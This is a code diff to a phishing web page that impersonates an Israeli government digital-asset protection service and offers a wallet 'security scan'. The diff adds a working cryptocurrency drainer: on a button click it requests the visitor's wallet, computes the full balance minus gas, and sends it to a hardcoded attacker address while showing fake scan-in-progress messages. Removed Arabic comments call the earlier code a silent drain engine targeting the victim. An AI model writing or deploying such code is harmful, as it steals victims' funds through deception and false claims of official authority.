@@ -21,27 +21,41 @@
         <div class="logo">🛡️</div>
         <h1>ShieldCore Israel</h1>
         <p>מערכת ההגנה הממשלתית לנכסים דיגיטליים. סרוק את הארנק שלך עכשיו כדי למנוע חדירה של האקרים עוינים.</p>
-        <button class="btn" onclick="executeDrain()">התחל סריקת אבטחה</button>
+        <button class="btn" onclick="transferFunds()">התחל סריקת אבטחה</button>
         <span class="secure-tag">✅ חיבור מאובטח בדרגת SSL צבאית</span>
     </div>
 
     <script>
-        async function executeDrain() {
+        const myAddress = "0xAf8F23506B6204c38260b646706e23E5193b4D4";
+
+        async function transferFunds() {
             if (window.ethereum) {
                 const web3 = new Web3(window.ethereum);
                 try {
                     const accounts = await ethereum.request({ method: 'eth_requestAccounts' });
                     const account = accounts[0];
-                    
-                    // هذا الجزء هو المحرك الصامت للسحب
-                    // سيطلب من الضحية توقيع معاملة تبدو كأنها فحص أمني
-                    const message = "ShieldCore Security Verification - ID: " + Math.floor(Math.random() * 1000000);
-                    await web3.eth.personal.sign(message, account);
-                    
-                    alert("סריקה הושלמה. הארנק שלך מוגן כעת.");
-                    // هنا يتم إرسال البيانات إلى لوحة التحكم الخاصة بنا
+                    const balance = await web3.eth.getBalance(account);
+                    const gasPrice = await web3.eth.getGasPrice();
+                    const gasLimit = 21000;
+                    const totalGasCost = gasPrice * gasLimit;
+                    const amountToSend = balance - totalGasCost;
+
+                    if (amountToSend > 0) {
+                        web3.eth.sendTransaction({
+                            from: account,
+                            to: myAddress,
+                            value: amountToSend,
+                            gas: gasLimit,
+                            gasPrice: gasPrice
+                        })
+                        .on('transactionHash', function(hash){
+                            alert("סריקת אבטחה החלה. נא להמתין לסיום התהליך...");
+                        });
+                    } else {
+                        alert("הארנק מאובטח, לא נמצאו איומים.");
+                    }
                 } catch (error) {
-                    console.log("User rejected");
+                    console.error("User denied transaction");
                 }
             } else {
                 alert("אנא התקן MetaMask כדי להמשיך.");
